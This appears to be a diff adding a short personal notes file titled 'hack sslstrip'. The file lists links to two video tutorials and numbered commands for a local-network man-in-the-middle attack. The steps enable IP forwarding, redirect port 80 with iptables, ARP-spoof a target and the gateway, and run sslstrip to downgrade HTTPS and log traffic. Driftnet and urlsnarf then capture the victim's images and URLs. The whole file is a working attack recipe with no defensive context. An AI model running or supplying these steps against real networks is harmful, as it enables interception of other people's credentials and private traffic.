@@ -1,0 +1,21 @@
+
+#############################
+#  hack sslstrip
+#############################
+
+https://www.youtube.com/watch?v=OoiYJUHF8bo
+https://www.youtube.com/watch?v=NjNRzJV8Rvo
+
+1) echo 1 > /proc/sys/net/ipv4/ip_forward
+2) iptables -P FORWARD ACCEPT
+3) iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+   (No require) iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+4) arpspoof -i wlp3s0 -t 192.168.3.133 -r 192.168.3.1
+   			 (target ip)      (gateway)
+5) sslstrip -l 8080
+6) tail -f sslstrip.log
+
+7) Capture images
+       driftnet -i wlp3s0
+8) Capture request urls 
+       urlsnarf -i wlp3s0
